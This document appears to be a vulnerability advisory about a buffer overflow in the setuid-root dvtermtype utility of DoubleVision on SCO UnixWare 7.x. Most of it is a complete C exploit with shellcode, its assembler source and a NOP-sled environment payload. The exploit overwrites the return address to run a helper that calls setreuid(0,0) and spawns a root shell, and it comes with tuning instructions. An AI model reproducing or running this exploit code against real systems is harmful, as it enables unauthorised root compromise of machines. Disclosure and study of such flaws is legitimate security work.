source: http://www.securityfocus.com/bid/1697/info

A utility integral to Tridia DoubleVision for SCO UnixWare 7.x has been found to be vulnerable to a buffer overflow attack.

dvtermtype, which is setuid root, is run by a user at login time to tell DoubleVision what terminal translations to use. The command line parameters are as follows:

$ dvtermtype termtype devicename

If a malicious user contructs a long termtype string and executes dvtermtype, dvtermtype will stack overflow. This can lead to a root compromise.

Tridia has different release schedules for each UNIX platform is supports. It is unclear what other UNIX builds of DoubleVision are vulnerable. 

/*
 * dvexploit.c
 *
 * written by : Stephen J. Friedl
 *              Software Consultant
 *              2000-06-24
 *              steve@unixwiz.net
 *
 *      This program exploits the "Double Vision" system on SCO
 *      Unixware 7.1.0 via a buffer overflow on the "dvtermtype"
 *      program. Double Vision is like a "pcAnywhere for UNIX",
 *      but quite a few programs in this distribution are setuid
 *      root. The problem is that these programs were not written
 *      with security in mind, and it's not clear that they even
 *      need to be setuid root.
 *
 *      This particular program exploits "dvtermtype" by passing a
 *      very long second parameter that overflows some internal
 *      buffer. This buffer is filled with a predicted address
 *      of the shellcode, and the shellcode itself is stored in
 *      a very long environment variable. This approach makes
 *      the shellcode much easier to find.
 *
 *      This shellcode was based directly on the great work of
 *      Brock Tellier (btellier@usa.net), who seems to spend a lot
 *      of time within with various SCO UNIX release. Thanks!
 *
 *      This shellcode runs /tmp/ui, which should be this simple
 *      program:
 *
 *      $ cd /tmp
 *      $ cat ui.c
 *      int main() { setreuid(0,0); system("/bin/sh"); return 0; }
 *      $ cc ui.c -o ui
 *
 *      Brock's original work compiled this automatically, but I
 *      prefer to do it by hand. A better approach is to do the
 *      setreuid() in the shellcode and call /bin/sh directly.
 *      Maybe another day.
 *
 * BUILD/TEST ENVIRONMENT
 * ----------------------
 *
 *      $ cc -v
 *      UX:cc: INFO: Optimizing C Compilation System  (CCS) 3.2  03/03/99 (CA-unk_voyager5)
 *
 *      $ uname -a
 *      UnixWare foo 5 7.1.0 i386 x86at SCO UNIX_SVR5
 *
 *      from /usr/lib/dv/README
 *
 *              DoubleVision for Character Terminals Release 3.0
 *              Last Update:  December 7, 1999
 *
 * TUNING
 * ------
 *
 *      The default parameters to this program work on the versions mentioned
 *      above, but for variants some tuning might be required. There are three
 *      parameters that guide this program's operation:
 *
 *      -a retaddr      set the "return" address to the given hex value,
 *                      which is the address where we expect to find the
 *                      exploit code in the environment. The environment
 *                      is at a relatively fixed location just below
 *                      0x80000000, so getting "close" is usually sufficient.
 *                      Note that this address cannot have any zero bytes
 *                      in it! We believe that the target code has enough
 *                      padding NOP values to make it an easy target.
 *
 *      -r retlen       length of the overflowed "return address" buffer,
 *                      which is filled in with the address provided above.
 *                      Default = 2k, max = 5k.
 *
 *      -l n            slightly shift the alignment of the return address
 *                      buffer by 1, 2 or 3 in case the buffer that's being
 *                      overflowed.
 */

#include <stdlib.h>
#include <stdio.h>

/*-----------------------------------------------------------------------
 * shellcode for SCO UnixWare
 *
 *      The shellcode in the binary was derived from assembler code
 *      below, and we put the asm() code inside the function so we
 *      can disassemble it and get the binary bytes easier. The code
 *      all should match, but the real original data is the full
 *      asm() code.
 */
#if 1

static const char scoshell[] =
        "\xeb\x19\x5e\x33\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11"
        "\x33\xc0\xb0\x3b\x8d\x7e\x07\x53\x57\x56\x56\xeb\x10\xe8"
        "\xe2\xff\xff\xff"
        "/tmp/ui"
        "\xaa\xaa\xaa\xaa"
        "\x9a\xaa\xaa\xaa\xaa\x07\xaa";

#else

extern char     scoshell[];

static void foo()
{

asm("#-------------------------------------------");
asm("scoshell:");
asm("           jmp     L1b");                  /* go to springboard    */
asm("   L2b:    popl    %esi");                 /* addr of /tmp/ui      */
asm("           xorl    %ebx,%ebx");            /* %ebx <-- 0           */
asm("           movl    %ebx,  7(%esi)");       /* mark end of string   */
asm("           movl    %ebx, 12(%esi)");       /* 0 to lcall addr      */
asm("           movb    %bl,  17(%esi)");       /* 0 to lcall sub addr  */
asm("           xorl    %eax,%eax");            /* %eax <-- 0           */
asm("           movb    $0x3b, %al");           /* 0x3b = "execve"      */
asm("           leal    7(%esi), %edi");        /* addr of NULL word    */
asm("           pushl   %ebx");                 /* zero                 */
asm("           pushl   %edi");                 /* addr of NULL word    */
asm("           pushl   %esi");                 /* addr of "/tmp/ui"    */
asm("           pushl   %esi");                 /* addr of "/tmp/ui"    */
asm("           jmp     L3b");                  /* do OS call           */
asm("   L1b:    call    L2b");
asm("           .ascii  \"/tmp/ui\"");          /* %esi                 */
asm("           .4byte  0xaaaaaaaa");           /* %esi[ 7]             */
asm("   L3b:    lcall   $0xaa07,$0xaaaaaaaa");  /* OS call              */
asm("           .byte   0x00");                 /* endmarker            */
asm("#-------------------------------------------");

}

#endif

#define NOP     0x90

static char     *env[10],       // environment strings
                *arg[10];       // argument vector

/*------------------------------------------------------------------------
 * "Addr" is the predicted address where the shellcode starts in the
 * environment buffer. This was determined empirically based on a test
 * program that ran similarly, and it ought to be fairly consistent.
 * This can be changed with the "-a" parameter.
 */
static long     addr = 0x7ffffc04;

static char     *exefile = "/usr/lib/dv/dvtermtype";

int main(int argc, char *argv[])
{
int     c;
int     i;
char    egg[1024];
int     egglen = sizeof egg - 1;
int     retlen = 2048;
char    retbuf[5000];
int     align = 0;
char    *p;

        setbuf(stdout, (char *)0 );

        while ( (c = getopt(argc, argv, "a:r:l:")) != EOF )
        {
                switch (c)
                {
                  case 'a':     addr = strtol(optarg, 0, 16); break;
                  case 'l':     align = atoi(optarg); break;
                  case 'r':     retlen = atoi(optarg); break;
                }
        }

        if ( optind < argc )
                exefile = argv[optind++];

        printf("UnixWare 7.x exploit for suid root Double Vision\n");
        printf("Stephen Friedl <steve@unixwiz.net>\n");
        printf("Using addr=0x%x   retlen=%d\n", addr, retlen);

        /*---------------------------------------------------------------
         * sanity check: the return buffer requested can't be too big,
         * and the address can't have any zero bytes in it.
         */
        if ( retlen > sizeof(retbuf) )
        {
                printf("ERROR: retlen can't be > %d\n", sizeof(retlen));
                exit(1);
        }

        p = (char *)&addr;

        if ( !p[0] || !p[1] || !p[2] || !p[3] )
        {
                printf("ERROR: ret address 0x%08lx has a zero byte!\n", addr);
                exit(1);
        }

        /*---------------------------------------------------------------
         * Now create the "return" buffer that is used to overflow the
         * return address. This buffer really has nothing in it other than
         * repeated copies of the phony return address, and one of them
         * will overwrite the real %EIP on the stack. Then when the called
         * function returns, it jumps to our code.
         *
         * It's possible that this requires alignment to get right, so
         * the "-l" param above can be used to adjust this from 0..3.
         * If we're aligning, be sure to fill in the early part of the
         * buffer with non-zero bytes ("XXXX");
         */
        strcpy(&retbuf, "XXXX");

        for (i = align; i < retlen - 4; i += 4)
        {
                memcpy(retbuf+i, &addr, 4);
        }
        retbuf[i] = 0;

        printf("strlen(retbuf) = %d\n", strlen( (char *)retbuf) );

        /*---------------------------------------------------------------
         * The "egg" is our little program that is stored in the environment
         * vector, and it's mostly filled with NOP values but with our little
         * root code at the end. Gives a wide "target" to hit: any of the
         * leading bytes hits a NOP and flows down to the real code.
         *
         * The overall buffer is
         *
         *      X=################xxxxxxxxxxxxxxxxxxxxx\0
         *
         * where # is a NOP instruction, and "X" is the exploit code. There
         * must be a terminating NUL byte so the environment processor does
         * the right thing also.
         */
        memset(egg, NOP, egglen);
        memcpy(egg, "EGG=", 4);

        // put our egg in the tail end of this buffer
        memcpy(egg + (egglen - strlen(scoshell)- 1), scoshell, strlen(scoshell));

        egg[egglen] = '\0';

        /* build up regular command line */

        arg[0] = exefile;
        arg[1] = "dvexploit";           /* easy to find this later */
        arg[2] = (char *)retbuf;
        arg[3] = 0;

        /*---------------------------------------------------------------
         * build up the environment that contains our shellcode. This
         * keeps it off the stack.
         */
        env[0] = egg;
        env[1] = 0;

        execve(arg[0], arg, env);
}
